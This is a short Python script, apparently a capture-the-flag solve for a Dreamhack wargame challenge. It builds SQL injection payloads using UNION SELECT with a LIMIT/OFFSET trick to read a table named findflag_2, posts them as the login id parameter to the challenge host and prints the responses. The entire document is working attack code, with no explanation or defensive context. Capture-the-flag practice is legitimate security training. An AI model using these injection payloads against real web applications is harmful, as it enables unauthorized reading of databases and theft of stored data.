import requests
from urllib.parse import quote_plus
TARGET_URL = 'http://host1.dreamhack.games:9616'

def req(id,pw,flag):
    data=f"id={quote_plus(id)}&pw={pw}&flag={flag}"

    print(data)
    res=requests.post(f"{TARGET_URL}/?{data}")

    return res.text

def sqli(cols, table, col):
    if table!='':
        #payload = f"' union select {col} from {table}-- 1"
        payload = f"' union select {cols} from {table} union select 1,{col},1,1,1 limit 1 offset 1-- 1"
    else:
        payload = f"' union select '1',{cols},'1','1','1'-- 1"

    print(req(payload,'navy','navy'))

#sqli('*','findflag_2')
sqli('@1,@2,@3,@4,@5','findflag_2','1')